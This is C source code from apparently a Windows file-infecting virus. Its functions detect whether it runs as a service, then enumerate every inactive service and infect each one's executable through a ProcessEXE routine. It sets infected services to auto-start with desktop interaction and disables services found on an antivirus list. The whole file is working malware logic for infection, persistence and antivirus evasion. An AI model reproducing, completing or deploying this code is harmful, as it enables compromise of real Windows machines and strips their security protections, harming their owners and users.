
///////////////////////////////////////////////////////////////
// check are we service ///////////////////////////////////////
BOOL CheckService()
{
	char usn[0xFF], cpn[0xFF];
	DWORD szusn, szcpn, l;

	unsigned char *env0, *env;
	BOOL SERVICEFND;

	if (isSystemNT()==0) 
		return FALSE;
 
	szusn = sizeof(usn);
	_GetUserName(usn, &szusn);

	//XP: 'LOCAL SERVICE', 'NETWORK SERVICE'
	//Win7, Server2008: 'NT SERVICE\...'
	if (usn[0]==0)
		return TRUE;
	if (serstr(usn,"SYSTEM",1) != 0xFFFF)
		return TRUE;
	if (serstr(usn," SERVICE",1) != 0xFFFF)
		return TRUE;

	szcpn=sizeof(cpn);
	_GetComputerName(cpn, &szcpn);

	// vista COMPNAME$ in USERNAME check
	_strcat(cpn,"$");
	if (serstr(cpn,usn,1) != 0xFFFF)
		return TRUE;

	// envlist 'systemprofile' and 'ervice' check
	env0 = _GetEnvironmentStrings();
	env = env0;
	SERVICEFND = FALSE;

	loop:;
		if (env[0]==0)
			goto skip;

		l = strlen(env);
		if (serstr(env,"ervice",1) != 0xFFFF)
		{ 
			SERVICEFND=TRUE;
			goto skip; 
		}       
		if (serstr(env,"systemprofile",1) != 0xFFFF) 
		{ 
			SERVICEFND=TRUE;
			goto skip;
		}
		
		env = env + l + 1;
	goto loop;

	skip:;
	_FreeEnvironmentStrings(env0);
	if (SERVICEFND)
		return TRUE;

	return FALSE;
}

///////////////////////////////////////////////////////////////
// Process service - infect ///////////////////////////////////
// InfectService()
void ProcessService(SC_HANDLE scm,char *sname,BOOL *SVCHOST,DWORD *START_SVC)
{
	QUERY_SERVICE_CONFIG *qsc;
	SC_HANDLE scs;
	int i;
	DWORD sz;
	DWORD ee;
	BOOL res;
	unsigned char search[10];
	unsigned char *exe;
	char chk[0xFF];
	DWORD SvcType, start; 

	 //for AVSVC check
	strcpy(chk,"|"); _strcat(chk,sname); _strcat(chk,"|");

	scs=_OpenService(scm,sname,SERVICE_QUERY_CONFIG|SERVICE_START|SERVICE_CHANGE_CONFIG);
	if (scs==NULL)
		return;

	//--- Query info: exe name & service type
	//get size we need
	_QueryServiceConfig(scs, NULL, 0, &sz); 

	qsc = _LocalAlloc(LMEM_FIXED, sz);
	res= _QueryServiceConfig(scs, qsc, sz, &ee);

	if (res == FALSE) 
		goto skip;

	//--- Process service exe name
	exe = qsc[0].lpBinaryPathName;               
	lowerstr(exe, exe);

	 //check for '.exe' presence
	if (serstr(exe,".exe",1) == 0xFFFF) 
		goto skip; 

	 //check for svchost.exe and check if SVCHOST 'processed flag' is TRUE
	if (serstr(exe,"svchost",1) != 0xffff)
	{
		if (*SVCHOST)
			goto skip; 
		else *SVCHOST=TRUE;
	}

	//ascii34==quote 
	if (exe[0]==34) 
	{
		 exe++; 
		 i=0; 
		 search[0]=34; 
		 search[1]=0; 
	} // quotes detected, this means path contains spaces
	else 
	{ 
		 i=4;
		 my_strcpy(search,".exe"); 
	} // no quotes stop after '.exe'

	ee = serstr(exe,search,1);
	if (ee==0xFFFF) 
		goto skip; 
	else 
		exe[ee+i]=0;


	//--- Infect

	// InfectFileStub
	res = ProcessEXE(exe, 0, FALSE); // CUT_LAST_CHAR==FALSE
	if (res == FALSE) 
	{
		// infect failed or already infected
		goto skip;   
	}

	//--- Set StartUp to AUTO & Allow interact with desktop
	SvcType = qsc[0].dwServiceType;
	start = SERVICE_AUTO_START;

	// this is AV service from our list
	if (serstr(AVSVC,chk,1) != 0xFFFF) 
		start=SERVICE_DISABLED; 

	if ((SvcType&SERVICE_INTERACTIVE_PROCESS)!=SERVICE_INTERACTIVE_PROCESS)
	{
		 SvcType=SvcType|SERVICE_INTERACTIVE_PROCESS;
	}
	else 
	{ 
		 if((start==SERVICE_AUTO_START)&&(qsc[0].dwStartType==SERVICE_AUTO_START))
			 goto start;
	} // all ok, no need to change config

	res = _ChangeServiceConfig(scs, SvcType, start, SERVICE_NO_CHANGE, NULL, NULL, NULL, NULL, NULL, NULL, NULL);

	if (res==0)
		goto skip;
	if (start == SERVICE_DISABLED)
	{
		// do not start AV service
		goto skip;
	}

	//--- Start Service
 start:;
	if (*START_SVC == 0)
		goto skip;

	res = _StartService(scs, 0, NULL);

	DbgPrint("ProcessService StartService res:%i (0 == failed)\n", res);

	if (res != 0)
		*START_SVC = *START_SVC - 1; 

skip:;
	_LocalFree(qsc);
	_CloseServiceHandle(scs);
}


///////////////////////////////////////////////////////////////
// List all inactive services /////////////////////////////////
// InfectServices()
int ProcessInactiveServices(DWORD START_SVC)
{
	SC_HANDLE scm;
	ENUM_SERVICE_STATUS ess[5000]; //~180kb
	int q;
	int w;
	int e=0;
	BOOL SVCHOST=FALSE;

	if (!isSystemNT()) 
		return 0;

	scm = _OpenSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
	if (_EnumServicesStatus(scm, SERVICE_WIN32, SERVICE_INACTIVE, &ess, sizeof(ess), &q, &w, &e) == 0) 
		return 0;

	DbgPrint("ProcessInactiveServices... %u inactive total, START_SVC:%i (0==FALSE)\n",w,START_SVC);

	// InfectService()
	for (q=0;q<w;q++) 
		ProcessService(scm, ess[q].lpServiceName, &SVCHOST, &START_SVC);

	_CloseServiceHandle(scm);
	return w;
}
